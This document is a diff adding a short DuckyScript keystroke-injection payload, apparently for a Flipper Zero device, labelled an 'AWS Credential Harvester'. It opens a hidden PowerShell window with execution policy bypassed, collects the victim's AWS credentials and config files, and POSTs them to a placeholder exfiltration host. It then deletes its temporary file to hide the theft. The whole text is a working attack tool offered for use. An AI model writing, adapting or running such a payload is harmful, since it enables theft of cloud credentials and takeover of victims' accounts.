@@ -1,0 +1,24 @@
+REM ===============================================================
+REM AWS Credential Harvester - NullSec Flipper Suite
+REM Extracts AWS credentials from common locations
+REM ===============================================================
+REM Target: Windows/Linux/macOS
+REM Author: bad-antics
+REM ===============================================================
+
+REM Windows AWS Credential Extraction
+GUI r
+DELAY 200
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 500
+STRING $aws = @(); $paths = @("$env:USERPROFILE\.aws\credentials","$env:USERPROFILE\.aws\config"); foreach($p in $paths){if(Test-Path $p){$aws += Get-Content $p}}; $aws | Out-File "$env:TEMP\aws_creds.txt"
+ENTER
+DELAY 300
+STRING Invoke-WebRequest -Uri "http://EXFIL_SERVER/aws" -Method POST -Body (Get-Content "$env:TEMP\aws_creds.txt" -Raw)
+ENTER
+DELAY 200
+STRING Remove-Item "$env:TEMP\aws_creds.txt" -Force
+ENTER
+STRING exit
+ENTER
